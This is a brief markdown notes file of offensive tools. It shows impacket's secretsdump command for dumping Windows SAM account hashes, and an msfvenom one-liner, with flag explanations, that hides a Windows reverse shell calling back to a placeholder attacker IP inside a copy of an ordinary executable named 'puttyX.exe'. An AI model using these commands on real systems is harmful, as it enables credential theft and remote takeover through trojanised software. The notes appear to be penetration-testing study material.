# List of useful tools

## Crypto Cracking

### impacket -> secretsdump.py
Clone the repo

`cd /opt && git clone https://github.com/fortra/impacket`

Use case

`python3 /opt/impacket/examples/secretsdump.py -sam <sam.bak file> -system <system.bak file> LOCAL`

This will dump users and hashes associated with the accounts.

## msfvenom

This is a large program and I will add things here eventually!

`msfvenom -a x64 --platform windows -x <executable name> -k -p windows/x64/shell_reverse_tcp lhost=<Attacker IP> lport=4444 -b "\x00" -f exe -o puttyX.exe`

### flags
* `--list <type>`: will show all modules for type. Use type `all` to list all
* `-a`: architecture of system
* `--platform`: windows/linux/etc
* `-x`: executables name
* `-k`: keep the behavior of the executable, but add payload as new thread
* `-p`: module to use ex. `windows/x64/shell_reverse_tcp`
* `-b`: bad bytes
* `-f`: output format
* `-o`: name of the output executable